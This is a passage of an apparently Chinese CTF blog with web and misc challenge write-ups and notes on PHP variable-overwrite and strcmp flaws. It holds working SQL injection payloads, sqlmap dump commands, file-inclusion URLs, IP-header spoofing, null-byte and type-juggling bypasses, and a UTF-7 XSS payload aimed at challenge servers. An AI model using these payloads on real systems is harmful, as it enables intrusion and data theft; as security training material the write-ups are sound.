(select\n3)c);'+chr(0),7,'2','u')\npcat(\"0 2nion select * from((select 1)a join (select group_concat(column_name) from\ninformation_schema.columns where table_name regexp 'you_want')b join (select\n3)c);\"+chr(0),7,'2','u')\npcat(\"0 2nion select * from((select 1)a join (select value from you_want limit 1)b join\n(select 3)c);\"+chr(0),6,'2','u')\npass\nif __name__ == '__main__':\nfoo()\nprint 'ok'\n```\n#### 后台登录  \n查看源码发现  \n```\n<!-- $password=$_POST['password'];\n\t$sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n\t$result=mysqli_query($link,$sql);\n\t\tif(mysqli_num_rows($result)>0){\n\t\t\techo 'flag is :'.$flag;\n\t\t}\n\t\telse{\n\t\t\techo '密码错误!';\n\t\t} -->\n```\n密码是经过md5哈希加密的，不懂网上查了一下，脑洞题，密码![image](https://img-blog.csdn.net/20180324215047728)中的ffifdyop   \n#### 上传绕过  \n随便上传一个png图片  \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry43htcz8j30eu05ct9c.jpg)   \n那上传一个PHP喃   \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry45loq5uj30k502idfv.jpg\n)  \n在上传绕过里最有名的的就是00截断，那么我们就先要抓包  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4a9zjkjj30zc0bxwfk.jpg)   \n\n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4fmdsgwj30zv0bljt5.jpg)\n\n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4gn71u3j3121096jsx.jpg)   \n#### Once More   \n提示：科学计数法  \n源码： \n```\n<?php\nif (isset ($_GET['password'])) {\n\tif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n\t{\n\t\techo '<p>You password must be alphanumeric</p>';\n\t}\n\telse if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n\t{\n\t\tif (strpos ($_GET['password'], '*-*') !== FALSE)\n\t\t{\n\t\t\tdie('Flag: ' . $flag);\n\t\t}\n\t\telse\n\t\t{\n\t\t\techo('<p>*-* have not been found</p>');\n\t\t}\n\t}\n\telse\n\t{\n\t\techo '<p>Invalid password</p>';\n\t}\n}\n?>\n\n```\n一道代码审计题，根据if语句要求，password必须大于9999999，但是长度小于8，而且还要等于*-*  \n根据提示科学计数法，再利用%00截断，因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配，构造password=1e8%00*-*   \n另一种方法也是利用题目中的函数遇到数字会返回NULL来绕过   \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4s56ahaj30w108jt9v.jpg  )   \n#### 程序逻辑问题  \n查看源码发现index.txt文件\n```\nif($_POST[user] && $_POST[pass]) {\n\t$conn = mysql_connect(\"********, \"*****\", \"********\");\n\tmysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n\tif ($conn->connect_error) {\n\t\tdie(\"Connection failed: \" . mysql_error($conn));\n} \n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) {\n\tprintf(\"Error: %s\\n\", mysql_error($conn));\n\texit();\n}\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n  \n  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {\n\techo \"<p>Logged in! Key:************** </p>\";\n}\nelse {\n    echo(\"<p>Log in failure!</p>\");\n\t\n  }\n  \n  \n}\n```\n根据源码可以看到两处特别需要重视的地方，很明显该sql语句存在注入漏洞，但是密码栏不能通过一般的注入来绕过，但是可以发现，只要满足了（$row[pw]) &&(!strcasecmp($pass,$row[pw])就可以拿到flag，也就是说，我们输入的$pass与从数据库取出来的pw一致就行，我们可以控制$pass的值，但是貌似不知道数据库中pw的值，但是我们可以直接用union select ‘某一个经过md5加密后的字符串’#来自己随意设定密码，注意这里一定是经过md5加密，不然会出错。  \n\n构造语句:’ and 0=1 union select ‘529CA8050A00180790CF88B63468826A’#\n\n密码：hehe\n\n就拿到flag了。  \n#### php大法  \n页面提示：index.php.txt  \n打开得到源码  \n```\n<?php\nif(eregi(\"hackerDJ\",$_GET[id])) {\\\\get传参的id值不能等于hackerDJ\n  echo(\"<p>not allowed!</p>\");\n  exit();\n}\n\n$_GET[id] = urldecode($_GET[id]);\\\\对id值进行一次解码\nif($_GET[id] == \"hackerDJ\")\n{\n  echo \"<p>Access granted!</p>\";\n  echo \"<p>flag: *****************} </p>\";\n}\n?>\n\n\n<br><br>\nCan you authenticate to this website?\n```\n值得一提的是我们在网页输入url时已经进行了一次url解码，所以这里解码了两次得到的hackerDJ，所以我们传入的原始值应该是两次url编码后的hackerDJ  \n构造url: index.php?id=%2568ackerDJ  \nflag: DUTCTF{PHP_is_the_best_program_language}\n#### Forms   \n打开链接后显示：   \n![image](http://t.cn/R1HUSzY)  \n发现只有一个输入框，什么也没有，查看源代码，发现有一个隐藏的输入框：  \n![image](http://t.cn/R1HUWvF)   \n这时按F12，修改type=\"hidden\"为\"text\"后就能看到输入框了，其中value=0,这时候还是不知道另外一个输入框该填什么，然后试着修改了一下value的值，令value=1,再提交一下，就看到进一步的提示了：   \n![image](http://t.cn/R1HUe2a)  \n这时复制pin值到输入框里就拿到flag  \n#### 简单的SQL注入2  \n试着先输入1，再输入1'，页面报语法错误，再输入1 '页面出现SQLi detected!，推出空格被它过滤了  \n用SQLmap跑一下  \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dbs  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryaa78kycj30b4022741.jpg)   \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --tables -D web1   \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryab0jtbaj30b601x0nc.jpg)  \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dump -C flag -T flag -D web1   \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg)\n#### 简单的SQL注入3  \n输入1，页面显示hello，输入1'，页面报错  \nsqlmap跑起来  \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_3.php?id=1 --dbs   \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryafzy505j30f5023dfl.jpg)  \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_3.php?id=1 --tables -D web1   \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryahgdnsjj30aw02i741.jpg)   \nsqlmap.py -u http://ctf5.shiyanbar.com/web/index_3.php?id=1 --dump -C flag -T flag -D web1   \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg)\n#### 简单的SQL注入   \n这道题也是sql注入，输入1，页面显示正常，输出1'，页面报错\n\n之后通过输入查表字段，发现union select 被过滤了,这是想到用两个union表示\n\n重复输入union select后发现空格也被过滤了，继续用两个空格代替一个空格   \n1.查询当前数据库\n\n1'  unionunion  selectselect  database()'  \n\n2.查询数据库中的表\n\n1'  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  '1'='1  \n\n3.查询字段名\n\n1' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name='flag   \n\n4.最后构造出1'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '1'='1  \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryamkr5hwj30kp062aab.jpg) \n#### 你真的会PHP吗？  \n抓包发现提示：  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryark9iifj30zu07jmy9.jpg)   \nhint:6c525af4059b4fe7d8c33a.txt    \n打开发现源码  \n```\n<?php\n\n\n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxx\";\n\nini_set(\"display_error\", false); \nerror_reporting(0); \n\n\nif(!isset($_POST['number'])){\n   header(\"hint:6c525af4059b4fe7d8c33a.txt\");\n\n   die(\"have a fun!!\"); \n}\n\nforeach([$_POST] as $global_var) { \n    foreach($global_var as $key => $value) { \n        $value = trim($value); \n        is_string($value) && $req[$key] = addslashes($value); \n    } \n} \n\n\nfunction is_palindrome_number($number) { \n    $number = strval($number); \n    $i = 0; \n    $j = strlen($number) - 1; \n    while($i < $j) { \n        if($number[$i] !== $number[$j]) { \n            return false; \n        } \n        $i++; \n        $j--; \n    } \n    return true; \n} \n\n\nif(is_numeric($_REQUEST['number'])){//这里判断的是未经trim()和addslashes()处理过的变量\n    \n   $info=\"sorry, you cann't input a number!\";\n\n}elseif($req['number']!=strval(intval($req['number']))){\n      \n     $info = \"number must be equal to it's integer!! \";  \n\n}else{\n\n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n\n     if($value1!=$value2){\n          $info=\"no, this is not a palindrome number!\";\n     }else{\n          \n          if(is_palindrome_number($req[\"number\"])){\n              $info = \"nice! {$value1} is a palindrome number!\"; \n          }else{\n             $info=$flag;\n          }\n     }\n\n}\n\necho $info;\n```\nPOST的number需要满足以下条件：  \n1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)   \n2.不能是一个回文数。（is_palindrome_number判断）   \n3.该数的反转的整数值应该和它本身的整数值相等。    \n绕过方法：   \n1.**利用intval函数溢出绕过**  \n$number不是数字；$number==strval(intval($number))；$number不是回文数\n\n这里要看下操作系统，32位有符号数int范围-2147483648 ~ 2147483647；64位 - 9223372036854775808~9223372036854775807\n可用payload\n32位：2147483647%00；%002147483647；2147483647%20  \n64位：9223372036854775807%00；%009223372036854775807；9223372036854775807%20   \n%00可以放在数字前后，%20只能放在后面；这里的%00或者是%20可以将数字解释为字符串        \n2.**用科学计数法构造0=0**   \n因为要求不能为回文数，但又要满足intval($req[\"number\"])=intval(strrev($req[\"number\"]))，所以我们采用科学计数法构造poc为number=0e-0%00，这样的话我们就可以绕过\n\n\n\n","tags":["ctf"]},{"title":"iscc ctf题小记","url":"/2018/05/14/iscc ctf题小记(1)/","content":"### ISCC CTF小计（更新中）\n上周经班上同学说起，才知道最近有个信息安全竞赛，题目比较基础，就尝试着做了一下，做的不多  \n#### MISC  \n##### What is that？  \n下载附件，得到一张图片  \n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgy3w9yq7j30ia0ekq3d.jpg)  \n\n看到手指指向的地方想到flag可能就在图片下面，根据经验，应该是修改图片宽度隐藏了flag    \n\n用winhex打开图片  \n这里就要了解一些png图片结构的一些知识了  \n[推荐阅读分析PNG图像结构](https://blog.csdn.net/joqian/article/details/8290389) \n\n找到表示图片长度宽度的十六进制码\n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfl1zjchkj30s90fewh3.jpg)  \n\n00 00 02 72 是图片的宽度  \n00 00 01 F4 是图片的长度  \n明显图片长宽并不标准，我们将长度修改为00 00 02 72，保存 得到flag \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1frfl8w7fnhj30he0het94.jpg)  \n\n##### 数字密文  \n题目给了一串数字**69742773206561737921**  \n观察发现每一位都是在0到9之间，想到了十进制编码，百度搜了一下，看见了这篇文章实验吧的一道题  \n[CTF---密码学入门第六题 古典密码](https://www.cnblogs.com/ECJTUACM-873284962/p/7774803.html)  \n于是把密文改成了\n&#69&#74&#27&#73&#20&#65&#61&#73&#79&#21用十进制解码发现是乱的，在想会不会是十六进制，用十六进制解码成功得到flag  \n   \n##### 秘密电报  \n压缩包解压得到  \n秘密电报：\n知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA  \n知识就是力量不是培根说的吗？培根密码无误    \n![image](https://images2017.cnblogs.com/blog/1100338/201710/1100338-20171017235425162-1445912366.png)  \n[放到在线解密网站得到flag](https://netair.xyz/tools/%e5%9f%b9%e6%a0%b9%e5%af%86%e7%a0%81%e5%8a%a0%e5%af%86%e8%a7%a3%e5%af%86.html)  \n\n##### 重重谍影  \n打开网页  \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfn2kss5kj31h708yjue.jpg)  \n题目提示：刹那便是永恒。南无阿弥陀佛。想到了土豆文  \n再看看页面上的应该是base64码\n\n\n多次解密得到一串不是base64的值（注意解码中的坑每次解码都需要将末尾的%3D，也就是“=”的url编码去掉），得到一串密文  \n\n\n>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5r\nKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkp\nb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc\n \n\n刚开始不知道是什么，问了一下做出来的同学，才知道是AES加密，把%0A换成换行符，找一个在线AES解码的平台得到密文:   \n\n\n答案就是后面这句但已加密  缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗\n\n\n是土豆文没错   \n[与佛论禅](http://www.keyfc.net/bbs/tools/tudoucode.aspx)\n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgf3wdyztj30yj0erjrx.jpg) \n  \n##### 有趣的ISCC  \n又是一张图片  \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgfq4hc3ij30g40g4gnc.jpg\n)    \n试了很多办法都没用，后面用winhex打开，发现文件尾部有一串Unicode编码  \n\n\n>&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#54;&#99;&#92;&#117;&#48;&#48;&#54;&#49;&#92;&#117;&#48;&#48;&#54;&#55;&#92;&#117;&#48;&#48;&#55;&#98;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#55;&#53;&#92;&#117;&#48;&#48;&#54;&#101;&#92;&#117;&#48;&#48;&#55;&#100;\n  \n\nUnicode解码得到\n\n\n>\\u0066\\u006c\\u0061\\u0067\\u007b\\u0069\\u0073\\u0063\\u0063\\u0020\\u0069\\u0073\\u0020\\u0066\\u0075\\u006e\\u007d\n  \n\n再转一次得到flag：flag{iscc is fun}  \n\n##### 凯撒十三世  \n提示：凯撒十三世在学会使用键盘后  \n密文：ebdgc697g95w3  \n猜测是凯撒密码加键盘密码  \n打开在线[凯撒密码网站](https://www.ctftools.com/down/down/passwd/)   移位数应该是13  \n刚开始以为是解密，解了半天什么都没有，结果是加密。。。加密得到 roqtp697t95j3       \n键盘密码：\n我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密：  \n1 2 3 4 5 6 7 8 9 0  \nQ W E R T Y U I O P  \nA S D F G H J K L  \nZ X C V B N M  \n\n我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：\n\n```\nA 12\nB 53\nC 33\nD 32\nE 31\nF 42\nG 52\nH 62\nI 81\nJ 72\nK 82\nL 92\nM 73\nN 63\nO 91\nP 01\nQ 11\nR 41\nS 22\nT 51\nU 71\nV 43\nW 21\nX 23\nY 61\nZ 13\n```\n\n第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置。\n得到flag：yougotme   \n  \n#### web  \n##### 比较数字大小  \n进去发现有一个输入框，随便输入一点  \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1frggckws36j30dq035glh.jpg\n)\n那输入数字吧  ，发现只能输入3位，提交  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1frggeqpogmj30b704b3yd.jpg\n) \n查看html代码发现\n\n```\n<html>\n    <head>\n        <meta http-equiv=Content-Type content=\"text/html;charset=utf-8\">\n    </head>\n    <body>\n                <form action=\"\" method=\"post\">\n            <input type=\"text\" maxlength=\"3\" name=\"v\"/>\n            <input type=\"submit\" value=\"提交\"/>\n        </form>\n    </body>\n</html>\n```\n数字太小了！   \n\n输入框限制了数字位数，修改\n\n```\n<input type=\"text\" maxlength=\"10\" name=\"v\"/>\n```\n\n\n再输入一个较大的数，得到flag：key is 768HKyu678567&*&K  \n\n##### web01  \n此道为代码审计题  \n\n```\n <?php\nhighlight_file('2.php');\n$flag='{***************}';\nif (isset($_GET['password'])) {  \n    if (strcmp($_GET['password'], $flag) == 0)  \n        die('Flag: '.$flag);  \n    else  \n        print 'Invalid password';  \n}  \n?> \n```\n\n题目要求是get传参password，这里涉及到strcmp函数的漏洞  \n\n```\nint strcmp ( string $str1 , string $str2 )\n```\n\n参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0  \n该漏洞是用于php5.3之前的版本  \n该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样  \n于是我们在url中输入？password[]=1,利用数组是非法参数报错，得到flag： ISCC{iscc\\_ef3w5r5tw\\_5rg5y6s3t3}   \n\n##### 本地的诱惑  \n提示：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？  \n只允许本地访问，那我们就用bp抓包伪造ip  \n[推荐文章网络安全之IP伪造](https://blog.csdn.net/jrn1012/article/details/39763819)  \n添加X-Forwarded-For请求头，修改IP地址为127.0.0.1  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgh20mp3oj311m0gegng.jpg)  \n得到flag    \n后面才发现。。。直接F12，flag就在html代码中。。。\n\n```\n<html>\n    <head>\n        <meta charset=\"utf-8\" />\n    </head>\n    <body>\n\n<?php \n//print_r($_SERVER);\n$arr=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);\nif($arr[0]=='127.0.0.1'){\n    //key\n    echo \"key is ISCC{^&*(UIHKJjkadshf}\";\n}else{\n\techo \"必须从本地访问！\";\n}\n?>    </body>\n</html>\n```\n\n##### 你能跨过去吗？  \n提示：xss\n题目：http://www.test.com/NodeMore.jsp?id=672613&page=2&pageCounter=32&undefined&callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&_=1302746925413  \n发现和实验吧的xss题有点类似  \n对网址进行转义，发现其中有段base64编码   \n\n```\nhttp://www.test.com/NodeMore.jsp?id=672613&page=2&pageCounter=32&undefined&callback=+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-&_=1302746925413 \n```\n\n看到类似“+/v+ +ADwAcwBjAHIAaQBwA”想到了UTF-7编码  \n[xssee](http://web2hack.org/xssee/)  在线解码得到 \n\n```\nhttp://www.test.com/NodeMore.jsp?id=672613&page=2&pageCounter=32&undefined&callback=+/v+ <script>alert(\"key:/%nsfocusXSStest%/\")</script>-&_=1302746925413 \n```\n\n将/%nsfocusXSStest%/输入提交框，弹出弹框：恭喜你！flag{Hell0World}  \n\n##### 一切都是套路    \n提示：好像有个文件忘记删了&flag is here  \n应该是备份文件泄露    \n找到文件泄露地址\nhttp://118.190.152.202:8009/index.php.txt  \n得到PHP代码\n\n```\n<?php\n\ninclude \"flag.php\";\n\nif ($_SERVER[\"REQUEST_METHOD\"] != \"POST\")\n\tdie(\"flag is here\");\n\nif (!isset($_POST[\"flag\"]) )\n\tdie($_403);\n\nforeach ($_GET as $k => $v){\n\t$$k = $$v;\n}\n\nforeach ($_POST as $k => $v){\n\t$$k = $v;\n}\n\nif ( $_POST[\"flag\"] !== $flag )\n\tdie($_403);\n\necho \"flag: \". $flag . \"\\n\";\ndie($_200);\n\n?>\n```\n\n又是代码审计  \n看到$$想到了变量覆盖漏洞，这类漏洞也常常和foreach联系在一起  \npost:flag=flag  \nget:?_200=flag  \npost传入变量使得flag变量的值为flag，绕过比较  \nget传参将flag变量的值赋值给_200，最后打印出来\n得到flag：flag ISCC{taolu2333333....}  \n\n\n##### 你能绕过吗?  \n刚开始以为是SQL注入，一直再瞎搞，后面经过朋友提示知道里是文件包含，PHP伪协议\n\n[推荐文章PHP伪协议](https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1)  \nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n\nphp://filter 参数  \n\n名称 | 描述\n---|---\nresource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。\nread=<读链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（_  \nwrite=<写链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（_  \n<；两个链的筛选列表>  | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。  \n利用PHP://filter过滤器读取index.php的代码，刚开始测试点是id，发现应该不是这里，再测试了f：  \nhttp://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index.php&id=4  \n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgsmnsabfj30x408odgd.jpg)  \n报错。。。\n后面发现过滤了php字符  \n修改：http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&id=4 （至于为什么要将index后面的.php删掉不太清楚）\n后面看了代码\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>å¯¼èªé¡µ</title>\n    <meta charset=\"UTF-8\">\n</head>\n<body>\n    <a href='index.php?f=articles&id=1'>ID: 1</href>\n    </br>\n    <a href='index.php?f=articles&id=2'>ID: 2</href>\n    </br>\n    <a href='index.php?f=articles&id=3'>ID: 3</href>\n    </br>\n    <a href='index.php?f=articles&id=4'>ID: 4</href>\n    </br>\n</body>\n</html>\n \n<?php\n    #ISCC{LFIOOOOOOOOOOOOOO}\n    if(isset($_GET['f'])){\n        if(strpos($_GET['f'],\"php\") !== False){\n            die(\"error...\");\n        }\n        else{\n            include($_GET['f'] . '.php');\n        }\n    }\n    \n?>\n```\n\n代码中过滤了php字符，并且会在f参数后加上.php，明白了\n\n##### web2  \n提示：错误！你的IP不是本机ip！  \n应该还是IP伪造  \n试了最常见的几个伪造ip响应头文件都不行      X-Forwarded-For   \nX-Client-IP  \nX-Real-IP   \nCDN-Src-IP  ...\n后面试了一下Client-IP ，成了  \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgweq2o3uj30ta06qdgk.jpg)    \n\n##### Please give me username and password!  \n页面显示：Please give me username or password!  \n那我们就get传参username和password先试一下  \nhttp://118.190.152.202:8017/?username=1&password=1000  \n查看代码发现  \n\n```\nUsername is not right<!--index.php.txt--><p>Password too long</p>\n```\n打开index.php.txt发现PHP代码  \n```\n<?php\nerror_reporting(0);\n$flag = \"***********\";\t\nif(isset($_GET['username'])){\n\tif (0 == strcasecmp($flag,$_GET['username'])){\n\t$a = fla;\n\techo \"very good!Username is right\";\n\t}\n\telse{\n\tprint 'Username is not right<!--index.php.txt-->';}\n}else\nprint 'Please give me username or password!';\nif (isset($_GET['password'])){\n\tif (is_numeric($_GET['password'])){\n\t\tif (strlen($_GET['password']) < 4){\n\t\t\tif ($_GET['password'] > 999){\n\t\t\t$b = g;\n\t\t\tprint '<p>very good!Password is right</p>';\n\t\t}else \n\t\t\tprint '<p>Password too little</p>';\n\t\t}else\n\t\tprint '<p>Password too long</p>';\n\t}else\n\tprint '<p>Password is not numeric</p>';\n}\nif ($a.$b == \"flag\")\n\tprint $flag;\n?>\n```\n\n\n```\nif (0 == strcasecmp($flag,$_GET['username'])){\n\t$a = fla;\n\techo \"very good!Username is right\";\n```\n\n\n这一段要求flag变量值要与username参数值相同，我们可以利用strcasecmp函数传入非法参数报错返回0绕过 \n\n\n```\nif (is_numeric($_GET['password'])){\n\t\tif (strlen($_GET['password']) < 4){\n\t\t\tif ($_GET['password'] > 999){\n\t\t\t$b = g;\n\t\t\tprint '<p>very good!Password is right</p>';\n```\n\n\n这一段是要求password的长度要小于4，但是值却要大于999，这里我们可以用科学计数法绕过  \n构造http://118.190.152.202:8017/index.php/?username[]=1&password=9E9  \n得到flag：flag{ISCC2018_Very_GOOD!}  \n\n##### php是世界上最好的语言  \n又是一道代码审计的题\n\n\n```\n<html>\n<body>\n<form action=\"md5.php\"  method=\"post\" >\n    用户名:<input type=\"text\" name=\"username\"/>\n    密码:<input type=\"password\" name =\"password\"/>\n    <input type=\"submit\" >\n</body>\n</html>\n<?php\nheader(\"content-type:text/html;charset=utf-8\");\nif(isset($_POST['username'])&isset($_POST['password'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n}\nelse{\n    $username=\"hello\";\n    $password=\"hello\";\n}\nif(md5($password) == 0){\n    echo \"xxxxx\";\n}\n\n\nshow_source(__FILE__);\n?>\n```\n\n\n要求的是post传入username和password两个参数，password参数的md5值要等于0   \n[推荐文章PHP处理0e开头md5哈希字符串缺陷/bug](https://www.cnblogs.com/Primzahl/p/6018158.html)  \n输入框输入username=1，password=QNKCDZO得到  \n\n\n```\nNULL <?php\ninclude 'flag.php';\n$a = @$_REQUEST['a'];\nstr_replace(\"{\",\"\",$a);\nstr_replace(\"}\",\"\",$a);\n@eval(\"var_dump($$a);\");\nshow_source(__FILE__);\n\n?> \n```\n\n\n这里又是$$变量覆盖漏洞使用全局数组变量GLOBALS打印出所有变量值  \nhttp://118.190.152.202:8005/no_md5.php?a=GLOBALS\n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgxmdmw8uj31f90c8goc.jpg)  \n\n##### SQL注入的艺术  \n找到个人信息处应该是宽字节注入，http://118.190.152.202:8015/index.php?id=1%27%df  \n利用SQLmap得到flag\n\n\n\n","tags":["ctf"]},{"title":"变量覆盖漏洞","url":"/2018/05/14/变量覆盖漏洞/","content":"### 变量覆盖漏洞\n变量覆盖指的是用我们自定义的参数值替换程序原有的变量值  \n[推荐阅读代码审计|变量覆盖漏洞 ](http://www.freebuf.com/column/150731.html)  \n##### 1.exartact函数\nexartact（）函数的作用是从传入数组中将变量导入当前符号表中，键名是变量名，键值是变量值。\n\n注：符号表是记录符号属性的表,它的每一表项表示一个标识符的属性信息.这些属性信息通常包括种类(常数,变量,数组,标号等),类型(整型,实型,逻辑型,字符型等),给名字分配的存储单元地址等。  \n\n该函数有三个参数var\\_array（必须，规定输入）、extract_type（可选，检查每个键名是否为合法变量）、prefix\n\n\n该函数出现变量覆盖漏洞通常有两种情况：\n（1）二参为EXTR_OVERWRITE,它表示有冲突时覆盖已有变量  \n（2）只有一参，默认二参为EXTR_OVERWRITE\n\n这道变量覆盖的ctf题中，extract函数是获取post传参后的以数组形式传入符号表，我们post传入pass=0&thepassword\\_123=0，将thepassword_123变量值赋值为0\n\n##### 2.parse_str函数\n该函数作用是解析字符串并且注册成变量，在注册变量之前不会验证变量是否已经存在，直接覆盖\n语法：  \nparse_str(string,array)\n\n```\n<?php\n$b=1;\nparse_str('b=2');\nprint_r(%$b);\n?>\n```\n输出的b的值变为了2  \n\n例：某ctf  \n```\n $id = $_GET['id'];\n@parse_str($id);\nif ($a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’)) {\n   echo $flag;\nPAYLOAD： ?id=a[0]=240610708\n```\n\n##### 3.import_request_variables函数  \n该函数是把GET,POST,COOKIE的参数注册为变量，用在register_globals被禁止的时候\n```\nbool import_request_variables ( string $types [, string $prefix ] )\n```\n　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀\n　　\n```\n<?php\n$a = 1;    //原变量值为1\nimport_request_variables('GP');   //传入参数时注册变量\nprint_r($a);  //输出结果为2\n?>\n```\n\n##### 4.$$变量覆盖   \n$$常常用在foreach函数中  \n例：\n\n```\n<?php\n\n//?name=test\n\n//output:string(4) “name” string(4) “test” string(4) “test” test\n\n$name=’thinking’;\n\nforeach ($_GET as $key => $value)\n\n$$key = $value;#$key=name,$$key=$name\n\nvar_dump($key);\n\n\nvar_dump($value);\n\nvar_dump($$key);\n\necho $name;#会输出test\n\n?>\n```\n\nforeach函数将get参数存入数组，我们构造payload：**index.php?name=meizijiu233**，name作为变量存入，$$key=$name=meizijiu233；判断通过\n\n","tags":["变量覆盖"]},{"title":"代码审计类ctf记录","url":"/2018/05/09/代码审计类ctf记录/","content":"#### 1.php strcmp()漏洞\n```\nint strcmp ( string $str1 , string $str2 )\n```\n参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0  \n该漏洞是用于php5.3之前的版本  \n该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样  \n```\n$pass=@$_POST['pass'];\n$pass1=***********;//被隐藏起来的密码\nif(isset($pass))\n{\nif(@!strcmp($pass,$pass1)){\necho 